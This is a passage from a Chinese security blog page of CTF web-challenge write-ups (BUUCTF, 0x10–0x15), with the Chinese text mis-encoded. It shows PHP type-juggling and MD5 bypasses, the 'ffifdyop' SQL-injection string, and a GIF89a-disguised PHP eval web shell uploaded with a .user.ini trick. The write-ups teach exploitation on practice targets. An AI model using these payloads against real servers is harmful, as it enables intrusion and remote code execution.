<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>BUU_WEBåˆ·é¢˜_0x10-0x1F - Ghostasky&#39;s Blog</title><meta name="author" content="Ghostasky">
<meta name="author-link" content="">
<meta name="description" content="0x10.[ACTF2020 æ–°ç”Ÿèµ›]Upload å’Œä¹‹å‰çš„ä¸€ä¸ªä¸€æ ·ï¼Œæ”¹ä¸ªåç¼€åå°±OKã€‚ 0x11.[ACTF2020 æ–°ç”Ÿèµ›]BackupFile å¯ä»¥ç®€å•æ‰«ä¸‹ï¼Œå‘ç°index.php.bak &lt;?php include_once &#34;flag.php&#34;; if(isset($_GET[&#39;key&#39;])) { $key = $_GET[&#39;key&#39;]; if(!is_numeric($key)) { exit(&#34;Just num!&#34;); } $key = intval($key); $str = &#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&#34;; if($key == $str) { echo $flag; } } else { echo &#34;Try to find out source file!&#34;; }strå¼±ç›¸ç­‰ï¼Œè¢«è½¬åŒ–ä¸ºæ•´å½¢ ä¼ å‚ke" /><meta name="keywords" content='WEB' /><meta itemprop="name" content="BUU_WEBåˆ·é¢˜_0x10-0x1F">
<meta itemprop="description" content="0x10.[ACTF2020 æ–°ç”Ÿèµ›]Upload å’Œä¹‹å‰çš„ä¸€ä¸ªä¸€æ ·ï¼Œæ”¹ä¸ªåç¼€åå°±OKã€‚ 0x11.[ACTF2020 æ–°ç”Ÿèµ›]BackupFile å¯ä»¥ç®€å•æ‰«ä¸‹ï¼Œå‘ç°index.php.bak &lt;?php include_once &#34;flag.php&#34;; if(isset($_GET[&#39;key&#39;])) { $key = $_GET[&#39;key&#39;]; if(!is_numeric($key)) { exit(&#34;Just num!&#34;); } $key = intval($key); $str = &#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&#34;; if($key == $str) { echo $flag; } } else { echo &#34;Try to find out source file!&#34;; }strå¼±ç›¸ç­‰ï¼Œè¢«è½¬åŒ–ä¸ºæ•´å½¢ ä¼ å‚ke"><meta itemprop="datePublished" content="2021-05-03T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-05-03T00:00:00+00:00" />
<meta itemprop="wordCount" content="4759">
<meta itemprop="keywords" content="WEB," /><meta property="og:title" content="BUU_WEBåˆ·é¢˜_0x10-0x1F" />
<meta property="og:description" content="0x10.[ACTF2020 æ–°ç”Ÿèµ›]Upload å’Œä¹‹å‰çš„ä¸€ä¸ªä¸€æ ·ï¼Œæ”¹ä¸ªåç¼€åå°±OKã€‚ 0x11.[ACTF2020 æ–°ç”Ÿèµ›]BackupFile å¯ä»¥ç®€å•æ‰«ä¸‹ï¼Œå‘ç°index.php.bak &lt;?php include_once &#34;flag.php&#34;; if(isset($_GET[&#39;key&#39;])) { $key = $_GET[&#39;key&#39;]; if(!is_numeric($key)) { exit(&#34;Just num!&#34;); } $key = intval($key); $str = &#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&#34;; if($key == $str) { echo $flag; } } else { echo &#34;Try to find out source file!&#34;; }strå¼±ç›¸ç­‰ï¼Œè¢«è½¬åŒ–ä¸ºæ•´å½¢ ä¼ å‚ke" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://ghostasky.github.io/posts/buu-web-0x10-0x1f/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-05-03T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-05-03T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BUU_WEBåˆ·é¢˜_0x10-0x1F"/>
<meta name="twitter:description" content="0x10.[ACTF2020 æ–°ç”Ÿèµ›]Upload å’Œä¹‹å‰çš„ä¸€ä¸ªä¸€æ ·ï¼Œæ”¹ä¸ªåç¼€åå°±OKã€‚ 0x11.[ACTF2020 æ–°ç”Ÿèµ›]BackupFile å¯ä»¥ç®€å•æ‰«ä¸‹ï¼Œå‘ç°index.php.bak &lt;?php include_once &#34;flag.php&#34;; if(isset($_GET[&#39;key&#39;])) { $key = $_GET[&#39;key&#39;]; if(!is_numeric($key)) { exit(&#34;Just num!&#34;); } $key = intval($key); $str = &#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&#34;; if($key == $str) { echo $flag; } } else { echo &#34;Try to find out source file!&#34;; }strå¼±ç›¸ç­‰ï¼Œè¢«è½¬åŒ–ä¸ºæ•´å½¢ ä¼ å‚ke"/>
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/buu-web-0x10-0x1f/" /><link rel="prev" href="http://ghostasky.github.io/posts/buu-web-0x1-0xf/" /><link rel="next" href="http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "BUU_WEBåˆ·é¢˜_0x10-0x1F",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/ghostasky.github.io\/posts\/buu-web-0x10-0x1f\/"
    },"genre": "posts","keywords": "WEB","wordcount":  4759 ,
    "url": "http:\/\/ghostasky.github.io\/posts\/buu-web-0x10-0x1f\/","datePublished": "2021-05-03T00:00:00+00:00","dateModified": "2021-05-03T00:00:00+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Ghostasky"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="auto" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">æœªè¯­ä¹‹ç—•</span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              >æ–‡ç« </a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              >åˆ†ç±»</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              >æ ‡ç­¾</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              >å…³äº</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="åˆ‡æ¢ä¸»é¢˜">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">æœªè¯­ä¹‹ç—•</span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                >æ–‡ç« </a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                >åˆ†ç±»</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                >æ ‡ç­¾</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                >å…³äº</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="åˆ‡æ¢ä¸»é¢˜"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="åˆé›†"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>BUU_WEBåˆ·é¢˜_0x10-0x1F</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky" data-title="Ghostasky" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ghostasky</span></span><span class="post-included-in">&nbsp;æ”¶å½•äº <a href="/categories/technology/" class="post-category" title="åˆ†ç±» - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="å‘å¸ƒäº 2021-05-03 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-05-03">2021-05-03</time></span>&nbsp;<span title="4759 å­—"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>çº¦ 4800 å­—</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>é¢„è®¡é˜…è¯» 10 åˆ†é’Ÿ</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>ç›®å½•</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#0x10actf2020-æ–°ç”Ÿèµ›upload">0x10.[ACTF2020 æ–°ç”Ÿèµ›]Upload</a></li>
        <li><a href="#0x11actf2020-æ–°ç”Ÿèµ›backupfile">0x11.[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</a></li>
        <li><a href="#0x12hctf-2018admin">0x12.[HCTF 2018]admin</a></li>
        <li><a href="#0x13æå®¢å¤§æŒ‘æˆ˜-2019buyflag">0x13.[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</a></li>
        <li><a href="#0x14bjdctf2020easy-md5">0x14.[BJDCTF2020]Easy MD5</a></li>
        <li><a href="#0x15suctf-2019checkin">0x15.[SUCTF 2019]CheckIn</a></li>
        <li><a href="#0x16zjctf-2019nizhuansiwei">0x16.[ZJCTF 2019]NiZhuanSiWei</a></li>
        <li><a href="#0x17æå®¢å¤§æŒ‘æˆ˜-2019hardsql">0x17.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</a></li>
        <li><a href="#0x18ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world">0x18.[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</a></li>
        <li><a href="#0x19ç½‘é¼æ¯-2018fakebook">0x19.[ç½‘é¼æ¯ 2018]Fakebook</a></li>
        <li><a href="#0x1agxyctf2019babysqli">0x1A.[GXYCTF2019]BabySQli</a></li>
        <li><a href="#0x1bç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz">0x1B.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</a></li>
        <li><a href="#0x1cmrctf2020ä½ ä¼ ä½ å‘¢">0x1C.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</a></li>
        <li><a href="#0x1dmrctf2020ez_bypass">0x1D.[MRCTF2020]Ez_bypass</a></li>
        <li><a href="#0x1egyctf2020blacklist">0x1E.[GYCTF2020]Blacklist</a></li>
        <li><a href="#0x1fæŠ¤ç½‘æ¯-2018easy_tornado">0x1F.[æŠ¤ç½‘æ¯ 2018]easy_tornado</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h3 id="0x10actf2020-æ–°ç”Ÿèµ›upload" class="heading-element"><span>0x10.[ACTF2020 æ–°ç”Ÿèµ›]Upload</span>
  <a href="#0x10actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bupload" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>å’Œä¹‹å‰çš„ä¸€ä¸ªä¸€æ ·ï¼Œæ”¹ä¸ªåç¼€åå°±OKã€‚</p>
<p><img loading="lazy" src="/posts/buu-web-0x10-0x1f/image-20210417185844946.png" alt="image-20210417185844946" srcset="/posts/buu-web-0x10-0x1f/image-20210417185844946.png?size=small, /posts/buu-web-0x10-0x1f/image-20210417185844946.png?size=medium 1.5x, /posts/buu-web-0x10-0x1f/image-20210417185844946.png?size=large 2x" data-title="image-20210417185844946" style="--width: 1263px;--aspect-ratio: 1263 / 655;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="0x11actf2020-æ–°ç”Ÿèµ›backupfile" class="heading-element"><span>0x11.[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</span>
  <a href="#0x11actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bbackupfile" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>å¯ä»¥ç®€å•æ‰«ä¸‹ï¼Œå‘ç°index.php.bak</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;Just num!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">==</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Try to find out source file!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>strå¼±ç›¸ç­‰ï¼Œè¢«è½¬åŒ–ä¸ºæ•´å½¢</p>
<p>ä¼ å‚key=123å¾—åˆ°flag</p>
<h3 id="0x12hctf-2018admin" class="heading-element"><span>0x12.[HCTF 2018]admin</span>
  <a href="#0x12hctf-2018admin" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Unicodeæ¬ºéª—ï¼š</p>
<p>å…·ä½“ç¼–ç å¯æŸ¥ï¼šhttps://unicode-table.com/en/search/?q=small+capital</p>
<p>á´¬á´°á´¹á´µá´º</p>
<h3 id="0x13æå®¢å¤§æŒ‘æˆ˜-2019buyflag" class="heading-element"><span>0x13.[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</span>
  <a href="#0x13%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019buyflag" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>payçš„é¡µé¢ä¸­æœ‰:</p>
<pre tabindex="0"><code>&lt;!--
	~~~post money and password~~~
if (isset($_POST[&#39;password&#39;])) {
	$password = $_POST[&#39;password&#39;];
	if (is_numeric($password)) {
		echo &#34;password can&#39;t be number&lt;/br&gt;&#34;;
	}elseif ($password == 404) {
		echo &#34;Password Right!&lt;/br&gt;&#34;;
	}
}
--&gt;</code></pre><p><img loading="lazy" src="/posts/buu-web-0x10-0x1f/image-20210418104024465.png" alt="image-20210418104024465" srcset="/posts/buu-web-0x10-0x1f/image-20210418104024465.png?size=small, /posts/buu-web-0x10-0x1f/image-20210418104024465.png?size=medium 1.5x, /posts/buu-web-0x10-0x1f/image-20210418104024465.png?size=large 2x" data-title="image-20210418104024465" style="--width: 619px;--aspect-ratio: 619 / 421;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="0x14bjdctf2020easy-md5" class="heading-element"><span>0x14.[BJDCTF2020]Easy MD5</span>
  <a href="#0x14bjdctf2020easy-md5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>æœ‰ä¸ªhintï¼š</p>
<pre tabindex="0"><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p>çœ‹äº†wpä¹‹åè¯´æ˜¯æœ‰ä¸ªffifdyopï¼ŒåŸç†æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²è¢«md5å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ276f722736c95d99e921722cf9ed621cï¼Œè€Œè¿™æ­Œå­—ç¬¦ä¸²å‰å‡ ä½æ­£å¥½æ˜¯ï¼š&lsquo;or'6ï¼Œæ°¸ä¸ºçœŸã€‚</p>
<p><img loading="lazy" src="/posts/buu-web-0x10-0x1f/image-20210418132914216.png" alt="image-20210418132914216" srcset="/posts/buu-web-0x10-0x1f/image-20210418132914216.png?size=small, /posts/buu-web-0x10-0x1f/image-20210418132914216.png?size=medium 1.5x, /posts/buu-web-0x10-0x1f/image-20210418132914216.png?size=large 2x" data-title="image-20210418132914216" style="--width: 688px;--aspect-ratio: 688 / 307;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>å› æ­¤æ‹¼æ¥åä¸ºï¼Œç›¸å½“äºä¸‡èƒ½å¯†ç ã€‚</p>
<pre tabindex="0"><code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code></pre><p>ä¹‹åï¼š</p>
<pre tabindex="0"><code>&lt;!--
$a = $GET[&#39;a&#39;];
$b = $_GET[&#39;b&#39;];

if($a != $b &amp;&amp; md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
--&gt;</code></pre><p>è¿™ä¸ªç»•è¿‡å°±æœ‰å¾ˆå¤šæ–¹æ³•äº†ï¼Œæ¯”å¦‚<code>php?a[]=1&amp;b[]=2</code>æˆ–è€…æ„é€ ä¸¤ç»„md5å€¼å¼€å¤´ä¸º0eçš„å€¼å³å¯ç»•è¿‡ã€‚</p>
<p>åœ¨ä¹‹åï¼š</p>
<pre tabindex="0"><code> &lt;?php
error_reporting(0);
include &#34;flag.php&#34;;

highlight_file(__FILE__);

if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])){
    echo $flag;
} </code></pre><p>è¿™é‡ŒæŠŠ==æ¢æˆäº†===ï¼Œ0eå¤§æ³•å¤±æ•ˆï¼Œåªèƒ½æ•°ç»„ç»•è¿‡ã€‚</p>
<h3 id="0x15suctf-2019checkin" class="heading-element"><span>0x15.[SUCTF 2019]CheckIn</span>
  <a href="#0x15suctf-2019checkin" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>GIF89a? &lt;script language=&#34;php&#34;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code></pre><p>ä¸Šä¼ </p>
<p><img loading="lazy" src="/posts/buu-web-0x10-0x1f/image-20210418161338218.png" alt="image-20210418161338218" srcset="/posts/buu-web-0x10-0x1f/image-20210418161338218.png?size=small, /posts/buu-web-0x10-0x1f/image-20210418161338218.png?size=medium 1.5x, /posts/buu-web-0x10-0x1f/image-20210418161338218.png?size=large 2x" data-title="image-20210418161338218" style="--width: 1246px;--aspect-ratio: 1246 / 453;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>æœ¬é¢˜çš„é‡ç‚¹æ¥äº†ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œ</p>
<p>user.iniã€‚å®ƒæ¯”.htaccessç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯nginx/apache/IISï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚å¯è°“å¾ˆå¹¿ï¼Œä¸åƒ.htaccessæœ‰å±€é™æ€§ï¼Œåªèƒ½æ˜¯apache.</p>
<p>ä»€ä¹ˆæ˜¯.user.iniï¼Ÿ</p>
<p>è¿™å¾—ä»php.iniè¯´èµ·äº†ï¼Œphp.iniæ˜¯phpçš„é»˜è®¤é…ç½®æ–‡ä»¶ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆ†ä¸ºå‡ ç§ï¼š</p>
